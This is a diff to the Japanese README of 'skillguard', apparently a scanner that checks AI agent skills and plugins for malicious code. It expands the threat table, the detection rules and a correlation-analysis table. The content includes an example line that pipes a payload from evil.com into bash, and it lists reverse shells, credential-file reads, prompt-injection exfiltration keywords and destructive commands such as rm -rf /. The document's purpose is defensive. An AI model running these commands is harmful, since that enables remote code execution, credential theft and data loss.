@@ -26,10 +26,12 @@ AIエージェント（Claude Code、Cowork など）は、スキルやプラグ
 |---------|--------|
 | インストール時リモートコード実行 | `curl https://evil.com/payload.sh \| bash` |
 | Pythonパス汚染（永続化） | `.pth` ファイルによるコード注入 |
-| 認証情報窃取 | `~/.aws/credentials`、`~/.ssh/id_rsa` の読み取りと外部送信 |
+| 認証情報窃取 | `~/.aws/credentials`、`~/.ssh/id_rsa`、`/etc/passwd` の読み取りと外部送信 |
 | サプライチェーン攻撃 | タイポスクワッティング、バージョン未固定の依存関係 |
 | MCPサーバー悪用 | `autoApprove: ["*"]`、無制限シェルアクセス |
 | 難読化ペイロード | base64・hex・ROT13でエンコードされたコマンド |
+| プロンプトインジェクション | プロンプト内の `exfiltrate`・`send this to` 指示による情報流出 |
+| ステルス通信 | IP直指定接続（DNS迂回）、C2ビーコン |
 
 ---
 
@@ -147,33 +149,55 @@ skillguard scan . --mode enforce --threshold 70
 
 ---
 
-## 検出ルール（100種類以上）
+## 検出ルール（120種類以上）
 
-8つのカテゴリで100種類以上のルールを実装しています。
+9つのカテゴリで120種類以上のルールを実装しています。
+さらに**相関分析**により単発では検出できない複合的な攻撃パターンも検知します。
 
-### 実行系（15種類）
-`curl|bash`、`wget|sh`、`base64 -d | bash`、`os.system()`、`eval()`、`subprocess shell=True`、PowerShellエンコードコマンド など
+### 実行系（20種類）
+`curl|bash`、`wget|sh`、`base64 -d | bash`、`os.system()`、`eval()`、`subprocess shell=True`、PowerShellエンコードコマンド、`importlib.import_module()` 変数引数、`__import__()`、`getattr()` 動的呼び出し、`subprocess` + `rm -rf`/`nc`/`dd` などの危険コマンド など
 
 ### 永続化（10種類）
 `.pth`ファイル注入、`sitecustomize.py`改ざん、`crontab`変更、`systemd`サービス登録、`.bashrc`改ざん、gitフック汚染 など
 
-### 認証情報アクセス（20種類）
-`~/.aws/credentials`、`~/.ssh/id_rsa`、`.env`ファイル、`kubeconfig`、GCPサービスアカウント、ブラウザCookieストレージ、各種APIキーのハードコード など
+### 認証情報アクセス（32種類）
+`~/.aws/credentials`、`~/.ssh/id_rsa`、`.env`ファイル、`kubeconfig`、GCPサービスアカウント、ブラウザCookieストレージ、各種APIキーのハードコード、**`/etc/passwd`・`/etc/shadow`**、**`/proc/*/environ`**（プロセス環境変数ダンプ）、**SSH host key**・`known_hosts` など
 
-### ネットワーク・情報漏洩（15種類）
-外部へのPOST送信、rawソケット、リバースシェル、ngrokトンネル、pastebin送信、C2ビーコンパターン など
+### ネットワーク・情報漏洩（17種類）
+外部へのPOST送信、rawソケット、リバースシェル、ngrokトンネル、pastebin送信、C2ビーコンパターン、**IP直指定接続**（DNS迂回）、**`print(os.environ...)`等のセンシティブデータ出力経路** など
 
-### サプライチェーン（15種類）
+### プロンプト・LLMリスク（4種類）
+**プロンプト文字列内の流出キーワード**（`exfiltrate`・`send this to`・`upload`）、センシティブデータ収集指示、**read→send チェーン記述**、`return os.environ` 等の出力経路 など
+
+### サプライチェーン（14種類）
 バージョン未固定の依存関係、ロックファイル欠如、カスタムPyPI/npmレジストリ、タイポスクワッティングパターン、git+URLによる依存関係 など
 
-### MCP・エージェントリスク（10種類）
+### MCP・エージェントリスク（9種類）
 `autoApprove: ["*"]`、`trust: all`、無制限シェルMCP、システムディレクトリへの書き込み権限、自動実行設定 など
 
-### 難読化（10種類）
+### 難読化（11種類）
 base64エンコードペイロード、16進数コマンド、`eval(atob(...))`、`compile()` + `exec()`、文字コード連結 など
 
-### 破壊的操作（5種類）
+### 破壊的操作（7種類）
 `rm -rf /`、フォーク爆弾、ディスクワイプ、`DROP DATABASE`、`shred -u` など
+
+---
+
+### 相関分析（9パターン）
+
+単発では検出が難しい**複合攻撃パターン**を自動検知します。
+
+| 相関パターン | 判定 | 意味 |
+|-------------|------|------|
+| 認証情報読み取り + ネットワーク送信 | CRITICAL | 認証情報の外部流出 |
+| 環境変数アクセス + ネットワーク送信 | CRITICAL | APIキー等の流出 |
+| eval/exec + ネットワーク | CRITICAL | リモートコード実行チェーン |
+| 難読化 + ネットワーク | CRITICAL | 隠蔽された流出 |
+| 永続化 + ネットワーク | CRITICAL | C2コールバック型バックドア |
+| base64 + ネットワーク送信 | CRITICAL | エンコード流出 |
+| 危険subprocess + 環境変数 | CRITICAL | 環境対応型破壊・バックドア |
+| プロンプト流出指示 + ネットワーク | CRITICAL | プロンプトインジェクション実行 |
+| IP直指定 + センシティブファイル読み取り | CRITICAL | ステルス認証情報流出 |
 
 ---
 
